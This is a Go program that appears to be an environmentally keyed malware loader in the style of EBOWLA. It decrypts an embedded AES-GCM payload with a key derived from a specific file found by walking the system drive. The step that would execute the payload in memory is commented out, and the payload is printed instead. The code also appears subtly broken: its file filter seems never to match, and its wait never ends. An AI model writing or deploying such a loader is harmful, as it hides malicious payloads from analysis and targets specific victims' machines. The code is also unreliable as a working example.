package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/sha512"
	_ "embed"
	"encoding/binary"
	"io/ioutil"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
)

var (
	seedPath string
	//go:embed "package"
	packageContent []byte
)

func main() {
	//loader, err := universal.NewLoader()
	//checkFatalErr("failed to instantiate loader", err)

	if len(seedPath) < 1 {
		seedPath = os.Getenv("SystemDrive") + string(os.PathSeparator)
	}
	keyOffset := binary.LittleEndian.Uint64(packageContent[:8])
	payload := packageContent[8:]
	potentialSeeds := make(chan string)

	wg := sync.WaitGroup{}
	for cpuIndex := 0; cpuIndex < runtime.NumCPU(); cpuIndex++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				seedFile, err := ioutil.ReadFile(<-potentialSeeds)
				if err != nil {
					continue
				}

				hasher := sha512.New()
				_, err = hasher.Write(seedFile[keyOffset : keyOffset+32])
				if err != nil {
					continue
				}

				cypher, err := aes.NewCipher(hasher.Sum(nil)[:32])
				if err != nil {
					continue
				}
				gcm, err := cipher.NewGCM(cypher)
				if err != nil {
					continue
				}
				nonceSize := gcm.NonceSize()
				decryptedPayload, err := gcm.Open(
					nil, payload[:nonceSize], payload[nonceSize:], nil,
				)
				if err != nil {
					continue
				}
				if len(decryptedPayload) < 1 {
					continue
				}
				//loader.LoadLibrary("loaded by EBOWLA2", &decryptedPayload)
				println(string(decryptedPayload))
				os.Exit(0) // replace with return to keep process open
			}
		}()
	}

	filepath.Walk(seedPath, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return nil
		}
		if !info.IsDir() {
			if strings.HasSuffix(path, seedPath) {
				potentialSeeds <- path
			}
		}
		return nil
	})

	wg.Wait()
}
